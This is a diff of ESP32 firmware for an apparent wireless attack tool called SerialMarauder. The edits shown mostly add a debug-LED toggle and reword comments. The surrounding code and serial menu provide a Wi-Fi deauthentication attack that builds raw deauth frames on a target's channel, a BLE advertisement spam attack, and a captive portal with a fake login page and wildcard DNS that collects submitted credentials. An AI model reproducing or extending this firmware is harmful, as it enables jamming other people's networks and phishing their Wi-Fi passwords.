@@ -1,3 +1,4 @@
+#include <Arduino.h>
 #include <WiFi.h>
 #include <DNSServer.h>
 #include <WebServer.h>
@@ -12,7 +13,7 @@ IPAddress apIP(172, 16, 0, 1);
 IPAddress netMsk(255, 255, 255, 0);
 DNSServer dnsServer;
 WebServer webServer(80);
-bool captivePortalActive = false;  // Flag to indicate if captive portal is active
+bool captivePortalActive = false;  // Flag indicating if the captive portal is active
 String capturedCredentials = "";
 
 String loginPage() {
@@ -56,11 +57,18 @@ void handleNotFound() {
 }
 
 // ---------------- SerialMarauder Functions ----------------
+
+// Global flag for debug LED behavior
+bool debugLedEnabled = true;
+
+// Modified activity LED: only flashes if debug LED mode is enabled
 void activityLED() {
-  digitalWrite(LED_BUILTIN, HIGH);
-  delay(50);
-  digitalWrite(LED_BUILTIN, LOW);
-  delay(50);
+  if (debugLedEnabled) {
+    digitalWrite(LED_BUILTIN, HIGH);
+    delay(50);
+    digitalWrite(LED_BUILTIN, LOW);
+    delay(50);
+  }
 }
 
 void scanWiFi() {
@@ -70,7 +78,7 @@ void scanWiFi() {
     Serial.printf("%d: %s (RSSI: %d) MAC: %s Channel: %d\n",
                   i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i),
                   WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
-    activityLED(); // Flash LED after printing each network
+    activityLED(); // Flash LED after printing each network if debug is enabled
   }
   Serial.println("Wi-Fi scan complete.");
 }
@@ -81,7 +89,7 @@ void deauthAttack(const char *targetMAC) {
          &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
   
   int networks = WiFi.scanNetworks();
-  int targetChannel = 1; // Default fallback
+  int targetChannel = 1; // default fallback
   for (int i = 0; i < networks; i++) {
     if (WiFi.BSSIDstr(i).equalsIgnoreCase(targetMAC)) {
       targetChannel = WiFi.channel(i);
@@ -92,7 +100,7 @@ void deauthAttack(const char *targetMAC) {
   Serial.printf("Switching to channel %d for deauth attack on %s\n", targetChannel, targetMAC);
   esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
   
-  activityLED(); // Flash before sending the packet
+  activityLED(); // Flash LED before sending the packet
   
   uint8_t deauthPacket[26] = {
     0xc0, 0x00, 0x3a, 0x01,
@@ -122,8 +130,9 @@ void scanBLE() {
     BLEAdvertisedDevice device = foundDevices.getDevice(i);
     String deviceName = device.haveName() ? device.getName().c_str() : "Unknown";
     Serial.printf("Device %d: %s (Name: %s) (RSSI: %d)\n",
-                  i + 1, device.getAddress().toString().c_str(), deviceName.c_str(), device.getRSSI());
-    activityLED(); // Flash for each BLE device found
+                  i + 1, device.getAddress().toString().c_str(),
+                  deviceName.c_str(), device.getRSSI());
+    activityLED();  // Flash LED for each BLE device found if debug is enabled
   }
   Serial.println("BLE scan complete.");
 }
@@ -146,7 +155,7 @@ void blespamAttack() {
     pAdvertising->setAdvertisementData(advData);
     pAdvertising->setScanResponseData(advData);
     
-    activityLED();  // Flash with each advertisement burst
+    activityLED();  // Flash LED with each burst if debug is enabled
     pAdvertising->start();
     delay(10);      // Short burst duration
     pAdvertising->stop();
@@ -154,28 +163,28 @@ void blespamAttack() {
   Serial.println("BLE spam attack complete.");
 }
 
-void toggleLED() {
-  int state = digitalRead(LED_BUILTIN);
-  digitalWrite(LED_BUILTIN, !state);
-  Serial.print("LED is now ");
-  Serial.println(!state ? "ON" : "OFF");
+void toggleDebugLED() {
+  debugLedEnabled = !debugLedEnabled;
+  Serial.print("Debug LED is now ");
+  Serial.println(debugLedEnabled ? "ENABLED" : "DISABLED");
 }
 
-// ------------------ Setup & Loop ------------------
+// ---------------- Setup & Loop ----------------
 void setup() {
+  // Remove M5StickC initialization and LCD calls
   pinMode(LED_BUILTIN, OUTPUT);
   digitalWrite(LED_BUILTIN, LOW);
 
   Serial.begin(115200);
 
-  // Setup Wi-Fi in AP mode for SerialMarauder functions (captive portal remains off)
+  // Setup Wi-Fi in AP mode for SerialMarauder functions (captive portal remains off by default)
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, netMsk);
   WiFi.softAP(portalSSID);
   Serial.print("AP IP address: ");
   Serial.println(WiFi.softAPIP());
 
-  // Setup captive portal routes (but don't start the server yet)
+  // Setup captive portal routes (but do not start the server yet)
   webServer.on("/", handleRoot);
   webServer.on("/post", HTTP_POST, handlePost);
   webServer.onNotFound(handleNotFound);
@@ -186,13 +195,13 @@ void setup() {
   Serial.println("  deauth <MAC> - Deauth attack");
   Serial.println("  blescan      - BLE scan");
   Serial.println("  blespam      - BLE spam attack (5 sec)");
-  Serial.println("  led          - Toggle LED");
+  Serial.println("  led          - Toggle debug LED flashing");
   Serial.println("  portal       - Activate captive portal");
   Serial.println("  stopportal   - Deactivate captive portal");
 }
 
 void loop() {
-  // If captive portal is active, process DNS and web server requests
+  // Process captive portal only if active
   if (captivePortalActive) {
     dnsServer.processNextRequest();
     webServer.handleClient();
@@ -213,7 +222,7 @@ void loop() {
     } else if (command == "blespam") {
       blespamAttack();
     } else if (command == "led") {
-      toggleLED();
+      toggleDebugLED();
     } else if (command == "portal") {
       if (!captivePortalActive) {
         dnsServer.start(53, "*", apIP);
